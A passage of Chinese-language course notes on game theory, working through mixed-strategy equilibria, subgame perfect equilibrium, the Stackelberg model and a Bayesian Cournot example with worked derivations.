活动相同，那么他们都会高兴，只是高兴程度略有不同
<figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/%E6%80%A7%E5%88%AB%E5%A4%A7%E6%88%98.png" />
    <figcaption>性别大战</figcaption>
</figure>
首先展示如何使用最优反应法计算混合策略纳什均衡。记丈夫的混合策略为 <span class="arithmatex">\((x,1-x)\)</span> (表示以 <span class="arithmatex">\(x\)</span> 的概率选择 <span class="arithmatex">\(F\)</span>、<span class="arithmatex">\(1-x\)</span> 的概率选择 <span class="arithmatex">\(C\)</span>)。妻子的混合策略为 <span class="arithmatex">\((y,1-y)\)</span>。对于丈夫的每个混合策略 <span class="arithmatex">\((x,1-x)\)</span>，妻子的最优反应集合为</p>
<div class="arithmatex">\[
br_2(x) = \arg \max_{y\in[0,1]} u_2(x,y)
\]</div>
<div class="arithmatex">\[
= \{y \in [0,1] : u_2(x,y) \geq u_2(x,z), \forall z \in [0,1]\}
\]</div>
<p>而 <span class="arithmatex">\(u_2(x,y) = xy \cdot 1 + (1-x)(1-y) \cdot 2 = 2 - 2x - 2y + 3xy\)</span>。将 <span class="arithmatex">\(x\)</span> 视为定值，对 <span class="arithmatex">\(y\)</span> 求导得到 <span class="arithmatex">\(3x-2\)</span>，因此可以得到最优反应集合为(丈夫同理)：</p>
<div class="arithmatex">\[
br_2(x) = \begin{cases}
\{0\} &amp; x \in [0,\frac{2}{3}] \\
[0,1] &amp; x = \frac{2}{3} \\
\{1\} &amp; x \in (\frac{2}{3},1]
\end{cases}
\]</div>
<div class="arithmatex">\[
br_1(y) = \begin{cases}
\{0\} &amp; y \in [0,\frac{1}{3}] \\
[0,1] &amp; y = \frac{1}{3} \\
\{1\} &amp; y \in (\frac{1}{3},1]
\end{cases}
\]</div>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/fig1.png" />
    <figcaption>图像</figcaption>
</figure></p>
<p>画图得到三个交点，分别是 <span class="arithmatex">\((0,0)\)</span>，<span class="arithmatex">\((0,1)\)</span>，<span class="arithmatex">\((\frac{2}{3},\frac{1}{3})\)</span>。
由混合策略纳什均衡下双方的对应的收益，可知混合策略下收益并没有达到最大，实际情况中往往是两者商量选择(F,F)或者(C,C)。</p>
<p>也可以使用无差异原则，丈夫选择F和C的收益相同,妻子仍然以混合策略 <span class="arithmatex">\((y,1-y)\)</span></p>
<p>也就是说</p>
<div class="arithmatex">\[
    2y = 1-y
\]</div>
<p>y=<span class="arithmatex">\(\frac{1}{3}\)</span>，同理可以得到x=<span class="arithmatex">\(\frac{2}{3}\)</span>。</p>
</div>
<div class="admonition info">
<p class="admonition-title">纳什定理</p>
<p>纳什定理每一个策略型博弈<span class="arithmatex">\(G\)</span>，如果参与人的个数有限，每个参与人的纯策略数目有限，那么 <span class="arithmatex">\(G\)</span> 至少有一个混合策略纳什均衡</p>
</div>
<h2 id="note-datamarket-gametheory-_4">完全信息动态博弈<a class="headerlink" href="#note-datamarket-gametheory-_4" title="Permanent link">&para;</a></h2>
<p><img alt="" src="../NOTE/DataMarket/img/%E8%9C%88%E8%9A%A3.png" /></p>
<div class="admonition definition">
<p class="admonition-title">扩展式博弈</p>
<p>博弈出现了参与人多轮交互，整体博弈被表达为了一棵树，这一类博弈被称为扩展式博弈（extensive-form game），其中</p>
<ul>
<li>根节点表示博弈的开始，每个叶节点都标志博弈的一个结束点；</li>
<li>每个非叶节点上都需要标注这一步的行动者；</li>
<li>每个叶节点上需要标注博弈在这一终点下的参与人效用</li>
</ul>
<p>扩展式博弈每个参与人的策略是一个向量，表示其在所有可能行动的节点上的行动。例如蜈蚣博弈中参与人 1 的策略可能是 <span class="arithmatex">\((C,C,C,S,\ldots,C,S)\)</span>；</p>
<ul>
<li>即使选定某一策略后博弈停止，也要将此后所有节点的策略都定义好。</li>
</ul>
<p>一个扩展式博弈的子博弈（subgame）由一个节点 <span class="arithmatex">\(x\)</span> 和所有该节点的后继节点组成；</p>
<ul>
<li>实际上就是 <span class="arithmatex">\(x\)</span> 为根的子树，记为 <span class="arithmatex">\(\Gamma(x)\)</span>。</li>
</ul>
<div class="admonition info">
<p class="admonition-title">完美信息博弈</p>
<p>如果每个参与人在选择行动时，都知道他位于博弈树的哪个节点上，那么
这个博弈就是完美信息博弈（game with perfect information），例如蜈蚣博弈，国际象棋等；</p>
<p>如果博弈中存在信息不完全的情况，那么这个博弈就是不完全信息博弈（game with imperfect information），例如扑克牌游戏，股票市场等。</p>
</div>
</div>
<div class="admonition definition">
<p class="admonition-title">子博弈完美均衡</p>
<p>子博弈完美均衡（subgame perfect equilibrium）是指对于扩展式博弈中的任意子博弈 <span class="arithmatex">\(\Gamma(x)\)</span>，局限在那个子博弈的策略向量 <span class="arithmatex">\(\sigma^*\)</span> 是 <span class="arithmatex">\(\Gamma(x)\)</span> 的纳什均衡。对每个参与人 <span class="arithmatex">\(i\)</span>，每个策略 <span class="arithmatex">\(\sigma_i\)</span> 和子博弈 <span class="arithmatex">\(\Gamma(x)\)</span>：</p>
<div class="arithmatex">\[
    u_i(\sigma^* | x) \geq u_i(\sigma_i,\sigma^*_{-i} | x)
\]</div>
<p>这一定义是很直观的，因为如果某个子博弈 <span class="arithmatex">\(\Gamma(x)\)</span> 上参与人存在有利可图的偏离，那么局面有达到也是一个有利可图的偏离。</p>
<details class="question">
<summary>Question</summary>
<p>当一个博弈存在不止一个均衡时，我们希望基于合理的选择标准选择一些均衡，而剔除另一些均衡，这样的一个选择叫做均衡精炼（equilibrium refinements）。</p>
<p>子博弈完美均衡是否是纳什均衡的精炼？换言之，是否存在不是子博弈完美均衡的纳什均衡？</p>
<p>是的，这个概念主要是为了排除"不可信的威胁"。比如，在一个博弈中，我威胁说"如果你不给我100块，我就会引爆一个会把我们俩都炸飞的炸弹"。这个威胁可能在博弈开始时能吓住你，构成一个纳什均衡。但如果博弈真的进行到了你没有给我钱的那个节点（子博弈），对我来说，引爆炸弹是一个极不理性的行为（因为我也会死）。因此，这个威胁是"不可信的"。SPE会排除这种依赖于不可信威胁的均衡。从下面的例子可以看到；</p>
<details class="answer">
<summary>Answer</summary>
<p><figure markdown="span">
<img alt="" src="../NOTE/DataMarket/img/subgame1.png" />
</figure></p>
<p>(A, C) 之所以能成为一个纳什均衡，是因为它背后隐藏着一个威胁：参与人II 对 I 说："你最好选A。如果你敢选B，我就会选C，到时候我们俩都得0。"
如果参与人I相信这个威胁，他会这样想："我选A能得1。如果我选B，II会选C，我只能得0。所以为了我的利益，我最好还是选A。"
这样一来，(A, C) 这个组合就稳定下来了，没有人愿意单方面偏离。</p>
<p>但这个威胁是"不可信"的:</p>
<p>因为如果I真的不信邪，选择了B，博弈就进行到了 x2 节点。此时，轮到II做决策，II会发现，选C自己得0，选D自己能得1。他作为一个理性的人，会立刻忘记自己之前的威胁，转而选择对自己最有利的D。</p>
<p>理性的参与人I应该能预见到这一点，他会知道II的威胁只是虚张声势。所以I的正确决策应该是选择B，因为他知道一旦选了B，II必然会选D，从而自己能得到2，这比选A得到的1要好。</p>
<p>例子中 <span class="arithmatex">\((A,C)\)</span> 能作为均衡，或者说 <span class="arithmatex">\(C\)</span> 这一被 <span class="arithmatex">\(D\)</span> 占优的策略可以成为均衡，是因为 <span class="arithmatex">\((A,C)\)</span> 到不了真正要选择 <span class="arithmatex">\(C,D\)</span> 的 <span class="arithmatex">\(x_2\)</span> 点。</p>
<p>用 <span class="arithmatex">\(P_\sigma(x)\)</span> 表示当实施策略向量 <span class="arithmatex">\(\sigma\)</span> 时，博弈展开将造访节点 <span class="arithmatex">\(x\)</span> 的概率。有如下定理：</p>
<p><mark class="critic">
定理：令 <span class="arithmatex">\(\sigma^*\)</span> 是扩展式博弈 <span class="arithmatex">\(\Gamma\)</span> 的纳什均衡，如果对所有 <span class="arithmatex">\(x\)</span> 都有 <span class="arithmatex">\(P_{\sigma^*}(x)&gt;0\)</span>，那么 <span class="arithmatex">\(\sigma^*\)</span> 是子博弈完美均衡。
</mark></p>
<ul>
<li>这是子博弈完美均衡的充分条件，定理是显然的，因为如果 <span class="arithmatex">\(\sigma^*\)</span> 不是子博弈完美均衡，那么在某个子博弈 <span class="arithmatex">\(\Gamma(x)\)</span> 上存在有利可图的偏离，并且这个偏离产生的概率不为 0，因此也可以带来全局的有利可图的偏离；这与纳什均衡的定义矛盾。</li>
</ul>
<p>在上面的 (A, C) 这个纳什均衡下，博弈路径根本不会经过 x2 节点，所以 <span class="arithmatex">\(P(x_2)=0\)</span>。因为永远走不到那一步，II所制定的那个不理性的策略（选C）就永远不会被检验，所以这个均衡在纳什均衡的框架下得以"幸存"。</p>
<p>而子博弈完美均衡的要求更严格，它会审查所有可能的路径（包括那些在均衡路径上不会发生的），确保每一步决策都是理性的。因此，它能够剔除掉 (A, C) 这种依赖于空洞威胁的、不那么"完美"的均衡。</p>
<ul>
<li>推论：完全混合的纳什均衡是子博弈完美均衡</li>
</ul>
</details>
</details>
</div>
<h3 id="note-datamarket-gametheory-_5">逆向归纳法<a class="headerlink" href="#note-datamarket-gametheory-_5" title="Permanent link">&para;</a></h3>
<p>可以从最小的子博弈触发求解</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/spe.png" width="60%" />
</figure>
<p>该方法的应用保证了每一个子博弈都使用了均衡策略，并且每一步都能做出选择，由此可得：</p>
<div class="admonition theory">
<p class="admonition-title">定理</p>
<p>每个有限完美信息扩展式博弈都至少有一个子博弈完美纯策略均衡</p>
</div>
<p>然而逆向归纳法存在局限性：不是子博弈完美均衡的均衡可能更好：</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/spe2.png" />
</figure>
<h3 id="note-datamarket-gametheory-_6">斯塔克尔伯格模型<a class="headerlink" href="#note-datamarket-gametheory-_6" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">斯塔克尔伯格模型 (Stackelberg Model)</p>
<p>经济学中子博弈完美均衡最基本的应用就是产量领导模型（或称斯塔克尔伯格模型），常用于描述有一家厂商处于支配地位或充当自然领导者的行业。例如 IBM 是具有支配地位的行业，通常观察到的其它小企业的行为模式是等待 IBM 宣布新产量然后调整自己的产量决策，此时 IBM 就是斯塔克尔伯格领导者，其它厂商是跟随者。</p>
<p>设市场中有两个厂商：</p>
<ul>
<li><strong>厂商 1 (领导者)</strong> : 选择产量 <span class="arithmatex">\(y_1\)</span></li>
<li><strong>厂商 2 (跟随者)</strong> : 选择产量 <span class="arithmatex">\(y_2\)</span></li>
<li><strong>市场价格</strong> : <span class="arithmatex">\(p(y_1 + y_2)\)</span></li>
<li><strong>成本</strong> : <span class="arithmatex">\(c_1(y_1)\)</span> 和 <span class="arithmatex">\(c_2(y_2)\)</span></li>
</ul>
</div>
<h4 id="note-datamarket-gametheory-_7">使用逆向归纳法求解<a class="headerlink" href="#note-datamarket-gametheory-_7" title="Permanent link">&para;</a></h4>
<p>斯塔克尔伯格模型是一个动态博弈，其子博弈完美均衡可以用逆向归纳法求解。这个过程可以被形式化为一个双层优化问题 (bi-level optimization problem)。</p>
<ul>
<li><strong>第一步：求解跟随者的最优反应</strong>
  我们从博弈的最后一步开始，即跟随者（厂商2）的决策。在领导者（厂商1）已经确定其产量 <span class="arithmatex">\(y_1\)</span> 的情况下，厂商2选择自己的产量 <span class="arithmatex">\(y_2\)</span> 来最大化其利润。厂商2的最优反应 <span class="arithmatex">\(y_2^* = f_2(y_1)\)</span> 是通过求解以下问题得到的：</li>
</ul>
<div class="arithmatex">\[
\max_{y_2} \pi_2(y_1, y_2) = p(y_1 + y_2)y_2 - c_2(y_2)
\]</div>
<p>这个最优反应函数 <span class="arithmatex">\(f_2(y_1)\)</span> 描述了对于领导者的每一个可能的产量，跟随者会如何选择自己的产量。</p>
<ul>
<li><strong>第二步：求解领导者的最优决策</strong></li>
</ul>
<p>领导者（厂商1）在做决策时，能够完全预见到跟随者会如何根据自己的决策做出反应。因此，领导者将跟随者的最优反应函数 <span class="arithmatex">\(f_2(y_1)\)</span> 视为已知，然后选择自己的产量 <span class="arithmatex">\(y_1\)</span> 来最大化自身利润。</p>
<p>领导者的利润最大化问题可以表述为：</p>
<div class="arithmatex">\[
    \max_{y_1} \pi_1(y_1, f_2(y_1)) = p(y_1 + f_2(y_1))y_1 - c_1(y_1)
\]</div>
<p>或者综合表达为：</p>
<div class="arithmatex">\[
    \max_{y_1} \pi_1(y_1, y_2) = p(y_1 + y_2)y_1 - c_1(y_1)
\]</div>
<div class="arithmatex">\[
    \text{s.t. } y_2 = \arg \max_{y_2} \pi_2(y_1, y_2)
\]</div>
<p>求解这个优化问题，就可以得到领导者的最优产量 <span class="arithmatex">\(y_1^*\)</span>，以及随后跟随者的最优产量 <span class="arithmatex">\(y_2^*=f_2(y_1^*)\)</span>。</p>
<p>先求解厂商 2 的最优反应函数 <span class="arithmatex">\(y_2^* = f_2(y_1)\)</span>，然后将其代入厂商 1 的利润函数中，求解厂商 1 的最优产量 <span class="arithmatex">\(y_1^*\)</span></p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>设总产量为 <span class="arithmatex">\(y_1+y_2\)</span> 时的市场价格为 <span class="arithmatex">\(2-y_1-y_2\)</span>，并且厂商 1 和 2 的生产一件产品的单位生产成本分别为 <span class="arithmatex">\(c_1,c_2\)</span>，求在该假设下二者的子博弈完美均衡产量</p>
<p>先写出厂商 1 和 2 的利润函数：</p>
<div class="arithmatex">\[
   \pi_1 = (2-y_1-y_2)y_1 - c_1y_1
\]</div>
<div class="arithmatex">\[
   \pi_2 = (2-y_1-y_2)y_2 - c_2y_2
\]</div>
<p>然后先对给定 <span class="arithmatex">\(y_1\)</span> 的情况下求厂商 2 的最优反应，解得</p>
<div class="arithmatex">\[
   y_2 = \frac{2-y_1-c_2}{2}
\]</div>
<p>然后将 <span class="arithmatex">\(y_2\)</span> 代入厂商 1 的利润函数，求解得到最优的</p>
<div class="arithmatex">\[
   y_1^* = \frac{2+c_2-2c_1}{2}
\]</div>
<p>最后将 <span class="arithmatex">\(y_1\)</span> 代入 <span class="arithmatex">\(y_2\)</span> 的表达式，求解得到最优的</p>
<div class="arithmatex">\[
   y_2^* = \frac{2+2c_1-3c_2}{4}
\]</div>
<p>与古诺模型的区别是，古诺模型中没有彼此的先后关系，也就不能回代；</p>
</div>
<h2 id="note-datamarket-gametheory-_8">不完全信息博弈<a class="headerlink" href="#note-datamarket-gametheory-_8" title="Permanent link">&para;</a></h2>
<p>考虑一个包括两个企业的行业博弈。假定这个行业有一个在位者（参与人1）和一个潜在的进入者（参与人 2）。参与人 1 决定是否建立一个新工厂，同时参与人 2 决定是否进入该行业。假定参与人 2 不知道参与人 1建厂的成本是 3 还是 0，但参与人 1 自己知道。</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/%E8%A1%8C%E4%B8%9A%E5%8D%9A%E5%BC%881.png" />
</figure>
<p>假设参与人 2 对参与人 1 的类型有先验概率：认为参与人 1 成本为 3（成本高）的概率为 <span class="arithmatex">\(p\)</span>，成本为 0（成本低）的概率为 <span class="arithmatex">\(1-p\)</span></p>
<ul>
<li>
<p>首先检查是否存在劣策略，参与人1有占优策略，成本低的时候始终选择建厂，成本高的时候选择不建厂；</p>
<p>根据参与人1的策略，参与人2进入的期望效用是参与人1成本高情况下(不建，进入)和成本低情况下(建，进入)的期望效用</p>
</li>
</ul>
<div class="arithmatex">\[
    p-(1-p) = 2p-1
\]</div>
<p>因此得到均衡，当 <span class="arithmatex">\(p&gt;\frac{1}{2}\)</span> 时，对于参与人 2，选择进入优于不进入，故选择进入，<span class="arithmatex">\(p&lt;\frac{1}{2}\)</span> 则选择不进入，<span class="arithmatex">\(p=\frac{1}{2}\)</span> 二者无差异。</p>
<hr />
<p>如果将低成本时的建厂成本设定为 1.5，如下表，则参与人 1 只在高
成本时有占优策略（不建厂）。</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/%E8%A1%8C%E4%B8%9A%E5%8D%9A%E5%BC%882.png" />
</figure>
<p>接下来只能使用无差异原则求解均衡。设参与人 1 低成本时建厂概率为 <span class="arithmatex">\(x\)</span>，参与人 2 进入概率为 <span class="arithmatex">\(y\)</span>。首先考虑是否存在纯策略均衡：</p>
<ul>
<li>
<p><span class="arithmatex">\(x=1,y=0\)</span>（对应纯策略组合（建厂，不进入）），对低成本的参与人 1 而言，<span class="arithmatex">\(x=1\)</span> 是 <span class="arithmatex">\(y=0\)</span> 的最优反应；对参与人 2，<span class="arithmatex">\(x=1\)</span> 时，<span class="arithmatex">\(y=0\)</span> 的效用为 0，<span class="arithmatex">\(y=1\)</span> 的效用为 <span class="arithmatex">\(p-(1-p)=2p-1\)</span>，故 <span class="arithmatex">\(y=0\)</span> 是 <span class="arithmatex">\(x=1\)</span> 的最优反应当且仅当 <span class="arithmatex">\(p\leq\frac{1}{2}\)</span>；</p>
</li>
<li>
<p>同理可以验证 <span class="arithmatex">\(x=0,y=1\)</span> 在任意的 <span class="arithmatex">\(p\)</span> 下都是均衡。</p>
</li>
</ul>
<p>接下来考虑混合策略均衡，根据无差异条件：</p>
<p>• 低成本参与人 1 是否建厂无差异：</p>
<div class="arithmatex">\[
1.5y + 3.5(1-y) = 2y + 3(1-y)
\]</div>
<p>解得 <span class="arithmatex">\(y=\frac{1}{2}\)</span>；</p>
<p>• 参与人 2 是否进入无差异：</p>
<div class="arithmatex">\[
p + (1-p)(-x+(1-x)) = 0
\]</div>
<p>解得 <span class="arithmatex">\(x=\frac{1}{2(1-p)}\)</span></p>
<p>总而言之，这一博弈存在两个纯策略均衡（其中一个有条件）和一个混合策略纳什均衡：</p>
<ul>
<li>
<p>均衡下高成本参与人 1 永远选择占优策略不建厂；</p>
</li>
<li>
<p>当 <span class="arithmatex">\(p \leq \frac{1}{2}\)</span> 时，低成本参与人 1 选择建厂，参与人 2 选择不进入；</p>
</li>
<li>
<p>低成本参与人 1 选择不建厂，参与人 2 选择进入；</p>
</li>
<li>
<p>低成本参与人 1 以 <span class="arithmatex">\(x=\frac{1}{2(1-p)}\)</span> 概率选择建厂，参与人 2 以概率 <span class="arithmatex">\(\frac{1}{2}\)</span> 选择进入，当p增大，x也增大，也就是说，若参与者2认为参与者1是高成本的概率增大，则参与者1会增大建厂的概率，以吓阻进入者。</p>
</li>
</ul>
<div class="admonition definition">
<p class="admonition-title">不完全信息博弈</p>
<p>从行业博弈出发，不完全信息博弈定义在策略式博弈基础上有如下改变：
原先的三元组需要扩展为五元组，需要增加每个参与人的类型集合
<span class="arithmatex">\((T_i)_{i\in N}\)</span>
和类型的先验分布 <span class="arithmatex">\(p\)</span>；</p>
<ul>
<li>先验分布 <span class="arithmatex">\(p\)</span> 是给每种类型向量 <span class="arithmatex">\((t_1,\ldots,t_n)\)</span> 赋予一个概率；</li>
<li>行业博弈中参与人 2 只有一种默认类型，故先验分布定义在两种类型
向量（高成本，默认类型）和（低成本，默认类型）上，此处显然默
认类型可以被省略，因此可以只定义参与人 1 两种类型的先验概率；</li>
</ul>
<p>在一般的情况下，上述 <span class="arithmatex">\(p\)</span> 给出的是联合概率分布，因此边际概率分布为</p>
<div class="arithmatex">\[
    p(t_i) = \sum_{t_{-i}} p(t_i, t_{-i})
\]</div>
<p>参与人是知道自己的类型为 <span class="arithmatex">\(t_i\)</span> 的，故对其他人的类型有后验概率分布为</p>
<div class="arithmatex">\[
    p(t_{-i} | t_i) = \frac{p(t_i,t_{-i})}{p(t_i)} = \frac{p(t_i,t_{-i})}{\sum_{t_{-i}} p(t_i, t_{-i})}
\]</div>
<p><figure markdown="span">
<img alt="" src="../NOTE/DataMarket/img/%E8%A1%8C%E4%B8%9A%E5%8D%9A%E5%BC%883.png" />
</figure></p>
</div>
<p>均衡的定义需要涉及收益的比较，故此处简单展开计算。当参与人策略组合为 <span class="arithmatex">\(\sigma=(\sigma_1,\ldots,\sigma_n)\)</span> 时，如果参与人类型组合是 <span class="arithmatex">\(t=(t_1,\ldots,t_n)\)</span>，那么每个纯策略组合 <span class="arithmatex">\((s_1,\ldots,s_n)\)</span> 被选择的概率是 <span class="arithmatex">\(\prod_{i\in N} \sigma_i(t_i;s_i)\)</span>，因此参与人 <span class="arithmatex">\(i\)</span> 的期望收益是</p>
<div class="arithmatex">\[
U_i(t; \sigma) = \sum_{s\in S} \prod_{i=1}^n \sigma_i(t_i; s_i)u_i(t; s),
\]</div>
<p>上述表达式中在不完全信息的情况下存在不确定性：参与人不知道其它参与人的类型，因此需要进一步对类型求取期望，得到（将 <span class="arithmatex">\(t\)</span> 拆成 <span class="arithmatex">\(t_i,t_{-i}\)</span>）</p>
<div class="arithmatex">\[
U_i(\sigma) \triangleq \mathbb{E}_{t_{-i}} U_i(t_i,t_{-i};\sigma) = \sum_{t_{-i}} p(t_{-i} | t_i)U_i(t_i,t_{-i};\sigma).
\]</div>
<p>这就得到了参与人策略组合为 <span class="arithmatex">\(\sigma=(\sigma_1,\ldots,\sigma_n)\)</span> 时，每个参与人 <span class="arithmatex">\(i\)</span> 效用的形式化表达</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/%E4%B8%8D%E5%AE%8C%E5%85%A8%E4%BF%A1%E6%81%AF%E9%9D%99%E6%80%81%E5%8D%9A%E5%BC%88.png" />

<figcaption>
    不完全信息静态博弈
</figcaption>
</figure>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>回忆古诺竞争是两个寡头同时决定产量的博弈。假定企业的利润为</p>
<div class="arithmatex">\[
    u_i = q_i(\theta_i - q_i - q_j)
\]</div>
<p>其中 <span class="arithmatex">\(\theta_i\)</span> 是线性需求函数的截距与企业 <span class="arithmatex">\(i\)</span> 的单位成本之差，<span class="arithmatex">\(q_i\)</span> 是企业 <span class="arithmatex">\(i\)</span> 选择的产量。</p>
<p>企业 1 的类型 <span class="arithmatex">\(\theta_1=1\)</span> 是共同知识，但企业 2 拥有关于其单位成本的私人信息。企业 1 认为 <span class="arithmatex">\(\theta_2=\frac{3}{4}\)</span>（高成本）和 <span class="arithmatex">\(\theta_2=\frac{5}{4}\)</span>（低成本）的概率均为 <span class="arithmatex">\(\frac{1}{2}\)</span>，且先验分布是共同知识。</p>
<div class="admonition answer">
<p class="admonition-title">Answer</p>
<p>首先将博弈表达为不完全信息的形式（写出五元组）</p>
<ul>
<li>参与人集合 <span class="arithmatex">\(N=\{1,2\}\)</span></li>
<li>策略集合 <span class="arithmatex">\(S_1=\{q_1\},S_2=\{q_2\}\)</span></li>
<li>收益函数 <span class="arithmatex">\(u_1(q_1,q_2,\theta_1)=q_1(\theta_1-q_1-q_2),u_2(q_1,q_2,\theta_2)=q_2(\theta_2-q_1-q_2)\)</span></li>
<li>类型集合 <span class="arithmatex">\(T_1=\{\theta_1=1\},T_2=\{\theta_2=\frac{3}{4},\theta_2=\frac{5}{4}\}\)</span></li>
<li>先验分布 <span class="arithmatex">\(p(\theta_2=\frac{3}{4})=\frac{1}{2},p(\theta_2=\frac{5}{4})=\frac{1}{2}\)</span></li>
</ul>
<p>接下来求解该博弈的纯策略贝叶斯纳什均衡。企业 2 的策略是依赖于其类型的产量函数 <span class="arithmatex">\(q_2(\theta_2)\)</span>，企业 1 的策略是单个产量 <span class="arithmatex">\(q_1\)</span>。</p>
<ul>
<li>
<p><strong>企业 2 的最优反应</strong></p>
<p>企业 2 知道自己的类型 <span class="arithmatex">\(\theta_2\)</span>，因此它在给定 <span class="arithmatex">\(q_1\)</span> 的情况下，选择 <span class="arithmatex">\(q_2\)</span> 来最大化自己的利润：</p>
<div class="arithmatex">\[
    \max_{q_2} q_2(\theta_2 - q_1 - q_2)
\]</div>
<p>通过一阶条件 <span class="arithmatex">\(\frac{\partial u_2}{\partial q_2} = \theta_2 - q_1 - 2q_2 = 0\)</span>，可以得到企业 2 的最优反应函数为：</p>
<div class="arithmatex">\[
    q_2^*(\theta_2) = \frac{\theta_2 - q_1}{2}
\]</div>
<p>因此，根据企业 2 的不同类型，我们有：</p>
<ul>
<li>低成本类型（<span class="arithmatex">\(\theta_2 = 5/4\)</span>）的产量为：<span class="arithmatex">\(q_2^L = q_2^*(5/4) = \frac{5/4 - q_1}{2}\)</span></li>
<li>高成本类型（<span class="arithmatex">\(\theta_2 = 3/4\)</span>）的产量为：<span class="arithmatex">\(q_2^H = q_2^*(3/4) = \frac{3/4 - q_1}{2}\)</span></li>
</ul>
</li>
<li>
<p><strong>企业 1 的最优反应</strong></p>
<p>企业 1 不知道企业 2 的类型，因此它选择 <span class="arithmatex">\(q_1\)</span> 来最大化自身的期望利润。它预期企业 2 会根据其类型来选择最优反应。</p>
<div class="arithmatex">\[
\begin{aligned}
    \max_{q_1} E[\pi_1] &amp;= \frac{1}{2} \pi_1(q_1, q_2^L) + \frac{1}{2} \pi_1(q_1, q_2^H) \\
    &amp;= \frac{1}{2} q_1(1 - q_1 - q_2^L) + \frac{1}{2} q_1(1 - q_1 - q_2^H)
\end{aligned}
\]</div>
<p>对 <span class="arithmatex">\(q_1\)</span> 求一阶导数并令其为 0，得到：</p>
<div class="arithmatex">\[
    \frac{dE[\pi_1]}{dq_1} = \frac{1}{2}(1 - 2q_1 - q_2^L) + \frac{1}{2}(1 - 2q_1 - q_2^H) = 1 - 2q_1 - \frac{q_2^L + q_2^H}{2} = 0
\]</div>
<p>解得企业 1 的最优产量为：</p>
<div class="arithmatex">\[
    q_1^* = \frac{2 - q_2^L - q_2^H}{4}
\]</div>
</li>
<li>
<p><strong>求解均衡</strong></p>
<p>我们将企业 2 的两个最优反应函数代入企业 1 的最优产量公式中，构成一个三元一次方程组并求解：</p>
<div class="arithmatex">\[
\begin{cases}
    q_1 = \frac{2 - q_2^H - q_2^L}{4} \\
    q_2^L = \frac{5/4 - q_1}{2} \\
    q_2^H = \frac{3/4 - q_1}{2}
\end{cases}
\]</div>
<p>将后两式代入第一式：</p>
<div class="arithmatex">\[
\begin{aligned}
    4q_1 &amp;= 2 - \left(\frac{3/4 - q_1}{2}\right) - \left(\frac{5/4 - q_1}{2}\right) \\
    4q_1 &amp;= 2 - \frac{1}{2} \left(\frac{3}{4} - q_1 + \frac{5}{4} - q_1\right) \\
    4q_1 &amp;= 2 - \frac{1}{2} (2 - 2q_1) \\
    4q_1 &amp;= 2 - 1 + q_1 \\
    3q_1 &amp;= 1 \implies q_1^* = \frac{1}{3}
\end{aligned}
\]</div>
<p>将 <span class="arithmatex">\(q_1^*\)</span> 的值代回，可得企业 2 的产量：</p>
<div class="arithmatex">\[
\begin{aligned}
    q_2^L &amp;= \frac{5/4 - 1/3}{2} = \frac{11/12}{2} = \frac{11}{24} \\
    q_2^H &amp;= \frac{3/4 - 1/3}{2} = \frac{5/12}{2} = \frac{5}{24}
\end{aligned}
\]</div>
<p>因此，该博弈的纯策略贝叶斯纳什均衡是：企业 1 生产 <span class="arithmatex">\(q_1^* = 1/3\)</span>；企业 2 在类型为 <span class="arithmatex">\(\theta_2=5/4\)</span> 时生产 <span class="arithmatex">\(q_2^L=11/24\)</span>，在类型为 <span class="arithmatex">\(\theta_2=3/4\)</span> 时生产 <span class="arithmatex">\(q_2^H=5/24\)</span>。</p>
<p>由于我们求解的是一个由线性最优反应函数组成的方程组，这个方程组有唯一的解。因此，不存在其他纯策略贝叶斯纳什均衡。</p>
</li>
</ul>
</div>
</div>
<div class="admonition example">
<p class="admonition-title">信息价值分析：对比不同信息结构下的利润</p>
<p>如果两个厂商都知道厂商 2 的类型，可以求出高低两种情况的纳什均衡，可以计算出此时的利润然后取平均；
 如果两个厂商都不知道厂商 2 的类型，本质上退回完全信息情景，厂商 2 自己都不知道自己的类型，故只能按平均值计算自己的策略，
 厂商 1 也知道厂商 2 按平均值计算，从而博弈退化到完全信息场景</p>
<table>
<thead>
<tr>
<th style="text-align: left;">关于厂商 2 的类型的知识</th>
<th style="text-align: center;">厂商 1 的利润</th>
<th style="text-align: center;">厂商 2 的利润</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">两个厂商都不知道</td>
<td style="text-align: center;">1/9</td>
<td style="text-align: center;">1/9</td>
</tr>
<tr>
<td style="text-align: left;">只有厂商 2 知道</td>
<td style="text-align: center;">1/9</td>
<td style="text-align: center;">≈ 0.127</td>
</tr>
<tr>
<td style="text-align: left;">两个厂商都知道</td>
<td style="text-align: center;">17/144</td>
<td style="text-align: center;">5/36</td>
</tr>
</tbody>
</table>
<p>首先推导一个公式</p>
<p>这是由利润最大化的一阶条件直接推导出来的。</p>
<ol>
<li>
<p><strong>企业 i 的利润函数为</strong>:</p>
<div class="arithmatex">\[ 
    u_i = q_i(\theta_i - q_i - q_j) 
\]</div>
</li>
<li>
<p><strong>利润最大化的一阶条件 (FOC)</strong> 是对 <span class="arithmatex">\(q_i\)</span> 求导并令其为 0:</p>
<div class="arithmatex">\[ 
    \frac{\partial u_i}{\partial q_i} = (\theta_i - q_i - q_j) - q_i = \theta_i - 2q_i - q_j = 0 
\]</div>
</li>
<li>
<p>从一阶条件中，我们可以得到:</p>
<div class="arithmatex">\[ 
    \theta_i - q_i - q_j = q_i 
\]</div>
</li>
<li>
<p>将这个结果代回到原始的利润函数中:</p>
<div class="arithmatex">\[ 
    u_i = q_i \underbrace{(\theta_i - q_i - q_j)}_{=q_i} = q_i \cdot q_i = q_i^2 
\]</div>
</li>
</ol>
<p>因此，在满足最优反应（即一阶条件成立））的任何点上，利润都等于其产量的平方。这在计算均衡利润时是一个非常方便的简化。</p>
<hr />
<p>Case 1: 两个厂商都不知道 (对称信息缺失)</p>
<p>在这种情况下，厂商 2 自己也不知道其成本是高是低。因此，它只能基于其类型的期望值来做决策。厂商 1 也知道厂商 2 是这样决策的。</p>
<ul>
